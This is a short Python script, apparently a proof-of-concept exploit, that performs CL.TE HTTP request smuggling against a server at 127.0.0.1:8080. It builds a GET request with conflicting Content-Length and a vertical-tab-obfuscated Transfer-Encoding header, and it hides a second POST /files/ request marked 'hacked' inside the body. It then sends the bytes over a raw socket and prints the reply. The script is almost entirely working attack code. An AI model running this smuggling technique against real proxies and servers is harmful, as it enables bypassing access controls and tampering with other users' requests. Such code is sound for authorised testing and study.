#!/usr/bin/env python3
import socket
import sys


CLTE_TEMPLATE = """GET / HTTP/1.1
Host: localhost
User-Agent: attacker
Content-Length: {length}
Transfer-Encoding:\x0bchunked

0

"""


def request(content):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect(("127.0.0.1", 8080))
    print(content)
    print()

    assert server.send(content) == len(content)
    data = server.recv(1024)
    while len(data) > 0:
        print(data.decode("utf-8"))
        data = server.recv(1024)

    try:
        server.shutdown(socket.SHUT_RDWR)
    except:
        pass
    server.close()


def clte(payload):
    offset = 5 + payload.count("\n")
    return (
        (CLTE_TEMPLATE.format(length=len(payload) + offset) + payload)
        .replace("\n", "\r\n")
        .encode("utf-8")
    )


def main():
    payload = """POST /files/ HTTP/1.1
Connection: close
Content-Length: 271
Content-Type: text/plain
User-Agent: hacked
X-guid: aa7e4586-d547-4a4a-a088-fc208a437a6c

"""

    request(clte(payload))


if __name__ == "__main__":
    sys.exit(main())
